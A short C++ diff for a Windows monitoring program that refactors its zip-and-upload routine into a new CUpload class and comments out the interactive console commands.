@@ -6,6 +6,7 @@
 #include "proc.h"
 #include "capture.h"
 #include "Store.h"
+#include "Upload.h";
 #include "Settings.h"
 
 CSettings settings;
@@ -187,6 +188,7 @@ void submitData()
 {
 	SysInfo info;
 	QuerySystemInfo(info);
+	CUpload upload;
 
 	char szHdd[MAX_PATH] = {0};
 	sprintf_s(szHdd, "%S", info.hddSerial);
@@ -203,9 +205,9 @@ void submitData()
 			sprintf_s(szFilename, "submit/%s", wfd.cFileName);
 			sprintf_s(szZipFilename, "submit/%s.zip", wfd.cFileName);
 
-			if (ZipFile(szFilename, szZipFilename))
+			if (upload.ZipFile(szFilename, szZipFilename))
 			{
-				if (SubmitFile(settings.GetString(SubmitServer), settings.GetString(EndUser), szHdd, szZipFilename))
+				if (upload.SubmitFile(settings.GetString(SubmitServer), settings.GetString(EndUser), szHdd, szZipFilename))
 				{
 					DeleteFileA(szFilename);
 				}
@@ -250,14 +252,14 @@ int consoleMain()
 	store.Open();
 	StartInterfacesMonitor(netCallback, 5, 250);
 
-	MAKE_COMMAND("nstart", "start connection monitor", &startNetworkMonitor);
-	MAKE_COMMAND("nstop", "stop connection monitor", &stopNetworkMonitor);
-	MAKE_COMMAND("submit", "submits data", &submitData);
-	MAKE_COMMAND("socks", "print sockets", &printSockets);
-	MAKE_COMMAND("procs", "print procs", &printProcs);
-	MAKE_COMMAND("info", "print sysinfo", &printSysinfo);
-	MAKE_COMMAND("help", "print help", &printHelp);
-	MAKE_COMMAND("quit", "exit program", &quitConsole);
+//	MAKE_COMMAND("nstart", "start connection monitor", &startNetworkMonitor);
+//	MAKE_COMMAND("nstop", "stop connection monitor", &stopNetworkMonitor);
+//	MAKE_COMMAND("submit", "submits data", &submitData);
+//	MAKE_COMMAND("socks", "print sockets", &printSockets);
+//	MAKE_COMMAND("procs", "print procs", &printProcs);
+//	MAKE_COMMAND("info", "print sysinfo", &printSysinfo);
+//	MAKE_COMMAND("help", "print help", &printHelp);
+//	MAKE_COMMAND("quit", "exit program", &quitConsole);
 
 	TCHAR szCommand[MAX_PATH] = {0};
 	do
